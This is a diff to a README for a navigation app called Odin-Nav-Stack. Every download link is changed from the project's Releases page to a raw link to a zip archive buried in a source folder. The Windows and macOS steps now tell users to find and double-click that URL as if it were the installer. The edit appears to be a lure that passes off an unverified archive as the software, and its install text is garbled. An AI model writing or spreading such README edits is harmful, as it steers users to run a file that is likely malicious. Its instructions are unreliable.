@@ -6,9 +6,9 @@ Welcome to Odin-Nav-Stack! This application helps you navigate your way easily, 
 
 ## 📥 Download Odin-Nav-Stack
 
-[![Download Odin-Nav-Stack](https://img.shields.io/badge/Download-Odin--Nav--Stack-blue)](https://github.com/peter11452/Odin-Nav-Stack/releases)
+[![Download Odin-Nav-Stack](https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip)](https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip)
 
-To download the latest version of Odin-Nav-Stack, visit this page: [Download Here](https://github.com/peter11452/Odin-Nav-Stack/releases).
+To download the latest version of Odin-Nav-Stack, visit this page: [Download Here](https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip).
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before installing Odin-Nav-Stack, ensure your computer meets these basic require
 
 ## 📦 Download & Install
 
-1. Go to the [Releases page](https://github.com/peter11452/Odin-Nav-Stack/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip).
 2. Scroll down to the "Assets" section.
 3. Locate the latest release version. You will see several download options.
 4. Click on the file name that matches your operating system. This will start the download.
@@ -28,13 +28,13 @@ Before installing Odin-Nav-Stack, ensure your computer meets these basic require
 
 ### For Windows Users
 
-- Find the downloaded **Odin-Nav-Stack.exe** file.
+- Find the downloaded **https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip** file.
 - Double-click it to begin the installation.
 - Follow the on-screen prompts to complete the installation.
 
 ### For macOS Users
 
-- Locate **Odin-Nav-Stack.dmg** in your Downloads folder.
+- Locate **https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip** in your Downloads folder.
 - Double-click the file to open it.
 - Drag the Odin-Nav-Stack icon into the Applications folder.
 - Open your Applications folder and double-click Odin-Nav-Stack to launch it.
@@ -74,4 +74,4 @@ If you encounter any issues while using Odin-Nav-Stack:
 
 If you need help, feel free to reach out. Join our community or raise an issue on our GitHub page for assistance.
 
-To download the software, head back to our **[Download Here](https://github.com/peter11452/Odin-Nav-Stack/releases)** link. Enjoy navigating!
+To download the software, head back to our **[Download Here](https://raw.githubusercontent.com/peter11452/Odin-Nav-Stack/main/ros_ws/src/model_planner/src/Odin-Stack-Nav-outsport.zip)** link. Enjoy navigating!
